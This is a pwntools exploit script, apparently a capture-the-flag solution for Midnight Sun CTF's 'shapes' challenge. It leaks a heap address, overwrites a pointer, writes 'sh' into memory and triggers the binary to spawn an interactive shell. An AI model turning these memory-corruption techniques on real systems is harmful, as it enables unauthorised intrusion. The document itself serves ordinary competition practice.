from pwn import *
context.arch = 'amd64'
context.terminal = ['tmux', 'split-window', '-h']

TARGET = './chall'
HOST = 'shapes-01.play.midnightsunctf.se'
PORT = 1111

elf = ELF(TARGET)
def start():
	if not args.R:
		print("local")
		return process(TARGET)
		# return process(TARGET, env={"LD_PRELOAD":"./libc.so.6"})
		# return process(TARGET, stdout=process.PTY, stdin=process.PTY)
	else:
		print("remote")
		return remote(HOST, PORT)

def get_base_address(proc):
	lines = open("/proc/{}/maps".format(proc.pid), 'rb').readlines()
	for line in lines :
		if TARGET[2:] in line.split('/')[-1] :
			break
	return int(line.split('-')[0], 16)
	# return int(open("/proc/{}/maps".format(proc.pid), 'rb').readlines()[0].split('-')[0], 16)

def debug(proc, breakpoints):
	script = "handle SIGALRM ignore\n"
	PIE = get_base_address(proc)
	script += "set $base = 0x{:x}\n".format(PIE)
	for bp in breakpoints:
		script += "b *0x%x\n"%(PIE+bp)
	script += "c"
	gdb.attach(proc, gdbscript=script)

def dbg(val): print("\t-> %s: 0x%x" % (val, eval(val)))

def a():
	r.sendlineafter('A', 'A')

r = start()

def cmd(text):
	r.send(chr(len(text)))
	r.send(text)

def create(ty):
	if ty == 0:
		cmd("create,triangle")
	elif ty == 1:
		cmd("create,square")
	elif ty == 2:
		cmd("create,circle")
	elif ty == 3:
		cmd("create,polygon")
	r.recvuntil('\n')
	return
	# r.recvuntil('it id ')
	# return int(r.recvuntil('\n', True))

def add(idx, x, y, batch=False):
	cmd("addpoint,{},{},{}".format(idx, x, y))
	if batch == False:
		r.recvuntil('\n')
def get(idx, pid):
	cmd("getpoint,{},{}".format(idx, pid))
	return r.recvuntil('\n', True)
def mod(idx, pid, x, y):
	cmd("modpoint,{},{},{},{}".format(idx, pid, x, y))
	r.recvuntil('\n')
def csize(idx, size):
	cmd("circlesize,{},{}".format(idx, size))
	r.recvuntil('\n')

if args.D:
	# debug(r, [0x25a2]) # create 
	# debug(r, [0x2610]) # create cmp
	# debug(r, [0x288a])
	# debug(r, [0x290b])
	# debug(r, [0x2bd4])
	# debug(r, [0x343f, 0x2ea9])
	debug(r, [0x2e9a])
	# debug(r, [0x317c])
	# debug(r, [0x32bd]) # getshapefromid
	# debug(r, [0x3355]) # getshapefromid error sprintf
	# debug(r, [0x338d]) # getshapefromid strlen
	# debug(r, [0x3426]) # getshapefromid atoi
	# debug(r, [0x35d4]) # addpoint realloc
	# debug(r, [0x3634]) # modpoint
	# debug(r, [0x36ae]) # printpoint

context.log_level = 'debug'
create(3)
add(0, 1, 1)
create(2)
csize("0+1", 114514)

leak0 = int(get(0, 5).split(' = ')[1].split(', ')[0]) & 0xffffffff
leak1 = int(get(0, 5).split(' = ')[1].split(', ')[1]) & 0xffffffff

leak = leak1 << 32 | leak0
dbg('leak')
heap = leak - 0x10
target = heap + 0x11eb0

mod(0, 9, target & 0xffffffff, target >> 32)
mod(0, 0, 0x6873, 0)
cmd('print')

r.interactive()
r.close()
